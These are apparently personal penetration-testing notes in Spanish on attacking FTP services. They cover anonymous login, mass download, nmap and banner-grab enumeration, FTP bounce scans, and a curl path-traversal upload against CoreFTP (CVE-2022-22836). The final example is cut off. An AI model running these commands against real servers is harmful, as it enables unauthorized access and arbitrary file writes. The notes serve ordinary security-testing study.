#ftp
## Interactuar con el servicio
### Conexión al servicio
```bash
ftp $target 
# a continuación probar con usuario anonymous
# Ejemplo poniendo usuario y en otro puerto
ftp anonymous@$target -P 2121
# Descargar un archivo
get archivo.txt

#Subir un archivo
put testupload.txt
```
### Descargar todos los archivos disponibles
```bash
wget -m --no-passive ftp://anonymous:anonymous@$target
```
### Montar servidor ftp
```bash
sudo python3 -m pyftpdlib --port 21
```
## Footprinting
### nmap básico
```bash
sudo nmap -sV -p21 -sC -A $target
```
Podemos encontrar los scripts relacionados con FTP con el siguiente comando
```bash
find / -type f -name ftp* 2>/dev/null | grep scripts
```
### Banner grabbing
```bash
# Si no hay una capa de TLS/SSL
nc -nv $target
telnet $target
# Si hay una capa de encriptación
openssl s_client -connect $target:21 -starttls ftp
```
## Ataques específicos del protocolo
### Fuerza bruta
[[Fuerza bruta#Servicios de red|sección de Fuerza bruta]]
### FTP bounce
Peermite a un atacante usar un servidor FTP como intermediario para enviar datos a otros sistemas en la red, haciendo que el ataque parezca originarse desde el servidor FTP
#### Enviar comando con `PORT`
```bash
PORT h1,h2,h3,h4,p1,p2
```
- **h1,h2,h3,h4**: Dirección IP de destino (en este caso, 10.10.10.11).
- **p1, p2**: Puerto codificado como dos bytes (puerto = `p1 * 256 + p2`)
Ejemplo: 
```bash
ftp 10.10.110.213
PORT 172,17,0,2,0,21
```
En función de si el puerto 21 de `172.17.0.2` está abierto devolverá un mensaje u otro
#### nmap
La flag `-b` permite realizar un ataque de este tipo: 
```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```
### CoreFTP
 Si al mostrar la versión del servicio ftp nos encontramos con que es un servidor de tipo CoreFTP, puede ser vulnerable ([CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836) ). Esta vulnerabilidad permite hacer una soliciitud tipo `HTTP PUT` con la que podemos subir contenido en un lugar arbitrario de la máquina
```bash
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```
Ejemplo 
```bash
xampp/ht

```